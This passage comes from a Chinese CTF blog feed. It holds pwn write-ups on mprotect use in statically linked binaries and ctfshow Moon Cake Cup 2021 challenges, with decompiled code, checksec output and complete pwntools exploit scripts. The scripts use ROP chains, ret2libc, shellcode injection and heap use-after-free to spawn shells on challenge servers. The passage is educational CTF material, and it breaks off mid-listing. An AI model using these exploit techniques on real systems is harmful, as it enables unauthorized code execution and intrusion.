class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./level3_x64'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'node4.buuoj.cn'</span>,<span class="number">26162</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="number">0x88</span>*<span class="string">'1'</span>+p64(<span class="number">0x0000000004006AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(e.got[<span class="string">'write'</span>])+p64(<span class="number">8</span>)+p64(e.got[<span class="string">'read'</span>])+p64(<span class="number">1</span>)+p64(<span class="number">0x000000000400690</span>)+<span class="string">'s'</span>*<span class="number">8</span>*<span class="number">7</span>+p64(e.sym[<span class="string">'vulnerable_function'</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr=p.recvuntil('\x7f')[:-6].ljust(8,'\x00')</span></span><br><span class="line">addr=u64(p.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex((addr)))</span><br><span class="line">x=finder(<span class="string">'read'</span>,addr)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">p.sendline(0x88*'1'+p64(0x00000000004006b3)+p64(x.dump('str_bin_sh'))+p64(x.dump('system')))</span></span><br><span class="line"><span class="string">#addr=0x00600000</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">rdx=<span class="number">0x00000000000cb1cd</span>+x.libcbase</span><br><span class="line">rdi=<span class="number">0x0000000000026796</span>+x.libcbase</span><br><span class="line">rsi=<span class="number">0x000000000002890f</span>+x.libcbase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"><span class="comment">#p.sendline(0x88*'1'+p64(rdi)+p64(0x00600a00)+p64(rsi)+p64(0x100000)+p64(rdx)+p64(7)+p64(x.dump('mprotect'))+p64(rdi)+p64(0)+p64(rsi)+p64(0x00600a00)+p64(rdx)+p64(0x100)+p64(x.dump('read'))+p64(0x00600a00))</span></span><br><span class="line">p.sendline(<span class="number">0x88</span>*<span class="string">'1'</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(<span class="number">0x1000</span>)+p64(rdx)+p64(<span class="number">7</span>)+p64(x.dump(<span class="string">'mmap'</span>))+<span class="string">'1'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#+p64(rdi)+p64(0)+p64(rsi)+p64(0x00600a00)+p64(rdx)+p64(0x100)+p64(x.dump('read'))+p64(0x00600a00))</span></span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br></pre></td></tr></table></figure><h2 id="利用机会-get-started-3dsctf-2016"><a href="#利用机会-get-started-3dsctf-2016" class="headerlink" title="利用机会-get_started_3dsctf_2016"></a>利用机会-get_started_3dsctf_2016</h2><p>一般情况下mprotect的使用都用点画蛇添足，但是在一些静态编译的题目中就是很有用的。比如：get_started_3dsctf_2016</p><p>这道题是32位的，静态编译中ban了system，但是给mprotect了。由于没有开PIE，我们可以将可控的一段程序写入读写执行权限，然后写入后门，来得到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   2exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/10/19 13:33:42</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./get_started_3dsctf_2016'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'node4.buuoj.cn'</span>,<span class="number">29847</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">gets=<span class="number">0x804f630</span></span><br><span class="line">edi_ret=<span class="number">0x0805099d</span></span><br><span class="line">addr=<span class="number">0x080ea900</span></span><br><span class="line">eax_ret=<span class="number">0x080b91e6</span></span><br><span class="line">ebx_ret=<span class="number">0x080481ad</span></span><br><span class="line">edx_ret=<span class="number">0x0806fc0a</span></span><br><span class="line">ret=<span class="number">0x08048196</span></span><br><span class="line">int80=<span class="number">0x0806d7e5</span></span><br><span class="line">ebx_edx_ret=<span class="number">0x0806fc09</span></span><br><span class="line">write=<span class="number">0x806e1b0</span></span><br><span class="line"><span class="comment">#0x080557ab : mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#0x080d8443 : xchg dword ptr [edx], ecx ; ret</span></span><br><span class="line"><span class="comment">#0x08048a26 : xchg eax, ecx ; ret 交换</span></span><br><span class="line"><span class="comment">#0x08048880 : mov ebx, dword ptr [esp] ; ret</span></span><br><span class="line">ecx_write_edxaddr=<span class="number">0x080557ab</span></span><br><span class="line"><span class="comment">#p.sendline(0x38*'1'+p32(e.sym['malloc'])+p32(0x0809e4c5)+p32(0x100000)+p32(0)+p32(0)+p32(ebx_edx_ret)+p32(1)+p32(addr)+p32(ecx_write_edxaddr)+p32(e.sym['write'])+p32(e.sym['main'])+p32(1)+p32(addr)+p32(4))</span></span><br><span class="line"><span class="comment">#shelladdr=u32(p.recv(4))-8</span></span><br><span class="line"><span class="comment">#log.info(hex(shelladdr))</span></span><br><span class="line">shelladdr=<span class="number">0x080ea000</span></span><br><span class="line">ppp=<span class="number">0x0804f460</span></span><br><span class="line">p.sendline(<span class="number">0x38</span>*<span class="string">'1'</span>+p32(e.sym[<span class="string">'mprotect'</span>])+p32(<span class="number">0x0809e4c5</span>)+p32(shelladdr)+p32(<span class="number">0x200</span>)+p32(<span class="number">7</span>)+p32(e.sym[<span class="string">'gets'</span>])+p32(ret)+p32(shelladdr))</span><br><span class="line">debug()</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#p.sendline(asm(shellcraft.sh()))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;当时在xman听大佬将leve5利用时，很疑惑要调用mprotect，明明可以溢出执行&lt;code&gt;system(&amp;#39;/bin/sh&amp;#39;)&lt;/code&gt;了. 直到我遇到些奇怪的静态编译题,我真香了故小记一下</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-月饼杯2021-pwn-wp</title>
    <link href="lexsd6.github.io/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/"/>
    <id>lexsd6.github.io/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/</id>
    <published>2021-09-21T06:17:42.396Z</published>
    <updated>2021-09-21T07:10:02.858Z</updated>
    
    <content type="html"><![CDATA[<p>久违参加了ctfshow的比赛，题都比较简单，就是远程环境libc我泄露半天才泄露出来… (⊙﹏⊙) <a id="more"></a></p><h2 id="简单的胖"><a href="#简单的胖" class="headerlink" title="简单的胖"></a>简单的胖</h2><p>题目简单就一个简单amd64位的栈溢出.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's your name? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  v6 = v3;</span><br><span class="line">  buf[v3 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome to the CTFshow Moon cake cup! %s!\n"</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下保护只开了NX.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>先一波正常栈溢出,通过<code>printf</code>函数泄露出libc的真实地址和libc版本.</p><p>(但这里远程环境libc 版本,我之前泄露libc死活泄露不出来,看了第二题的libc才猜测两题环境可能一样,tcl)</p><p>然后再通过一波栈溢出getshell.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/09/20 15:40:41</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./moonpwn01'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28075</span>]</span><br><span class="line"><span class="comment">#GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x00000000004006fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006fe : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400700 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400702 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006ff : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400578 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400703 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400701 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004004ce : ret </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">rdi_ret=<span class="number">0x0000000000400703</span></span><br><span class="line">ret=<span class="number">0x00000000004004ce</span> </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x28</span>+p64(ret)+p64(rdi_ret)+p64(e.got[<span class="string">'printf'</span>])+p64(e.sym[<span class="string">'printf'</span>])+p64(e.sym[<span class="string">'_start'</span>]))</span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(hex(addr))</span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'printf'</span>,addr) <span class="comment">#Ubuntu GLIBC 2.27-3ubuntu1</span></span><br><span class="line"><span class="comment">#p.sendline('1'*0x28+p64(rdi_ret)+p64(0x601100)+p64(x.dump('gets'))+p64(rdi_ret)+p64(0x601100)+p64(x.dump('puts'))+p64(rdi_ret)+p64(0x601100)+p64(ret)+p64(x.dump('system'))+p64(e.sym['_start']))</span></span><br><span class="line"><span class="comment">#p.sendline('/bin/sh\x00')</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x28</span>+p64(rdi_ret)+p64(x.dump(<span class="string">'str_bin_sh'</span>))+p64(ret)+p64(x.dump(<span class="string">'system'</span>))+p64(e.sym[<span class="string">'_start'</span>]))</span><br><span class="line">debug()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="容易的胖"><a href="#容易的胖" class="headerlink" title="容易的胖"></a>容易的胖</h2><p>题目是i386(32位)题目,先看来下了保护发现不仅什么没开.还有读写执行权限(喜).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>审计下题目代码,发现通过fgets函数用我们可以写入至多256个字节长度的shellcode.</p><p>同时,<code>read(0, &amp;s, 0x14u);</code>触有栈溢出但只能让我们溢出到<code>edp</code>.</p><p>加上,有<code>strcmp(&amp;s, &quot;yes\n&quot;)</code>判断需要我们bypass.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;a1;</span><br><span class="line">  sub_80485A6();</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(::s, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your shellcode"</span>);</span><br><span class="line">  fgets(::s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you know how to use shellcode????"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s, <span class="string">"yes\n"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you may be need learn it"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ok,good"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过<code>yes\n\x00</code>+code的方法来绕过strcmp函数。同时，由于题目没有开NX与PIE，因此我们可以通过ida静态分析出通过fgets函数写入的shellcode存放到<code>0x804a040</code>。</p><p>因此我们可以通过栈溢出控制<code>edp</code>，再通过栈特性间接控制<code>eip</code>，在让让<code>eip</code>指向我们shellcode的地址，从而getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/09/20 16:41:27</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./moonpwn02'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line">ip_port=[<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28157</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(p32((<span class="number">0x804a040</span>+<span class="number">4</span>))+asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#print(hex(len(pay)))</span></span><br><span class="line">p.sendline(<span class="string">'yes\n\x00'</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+<span class="string">'\x00'</span>*<span class="number">0x8</span>+p32(<span class="number">0x804a040</span>+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Moon-note"><a href="#Moon-note" class="headerlink" title="Moon_note"></a>Moon_note</h2><p>题目所有保护全开，是个堆题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>题目主要分为creat_notetitle,creat_content,show_content,delet_content_title.</p><p>题目主要问题出现在free chunk功能函数处：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Title of note to delete: "</span>);</span><br><span class="line">  getnline(&amp;v2, <span class="number">16L</span>L);</span><br><span class="line">  ptr = find_note(&amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(*((_QWORD *)ptr + <span class="number">2</span>) + <span class="number">24L</span>L) = *((_QWORD *)ptr + <span class="number">3</span>);</span><br><span class="line">    *(_QWORD *)(*((_QWORD *)ptr + <span class="number">3</span>) + <span class="number">16L</span>L) = *((_QWORD *)ptr + <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr + <span class="number">4</span>)); <span class="comment">//没有清空内容</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//没有note titile chunk清空内容</span></span><br><span class="line">    --<span class="built_in">size</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于在free时没有清空残余内容，导致uaf存在。</p><p>通过notetitle chunk free后，再add 仍指向content chunk .从而通show函数泄露出content chunk addr。</p><p>同时，经过测试libc版本低于2.29。因此还可以利用这free chunk 功能函数制造content chunk  double free。</p><p>从而让content chunk 错位改造出大于0x420的chunk 头，free掉构造出unsorted bin，从而泄露出libc。</p><p>然后通过<code>__free_hook</code>getshell。</p><p>（ps：这里偏移很奇怪，我原来本地libc2.27泄露出来unsorted bin addr 到<code>main_arena</code>为88 字节，然而远程环境为96）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 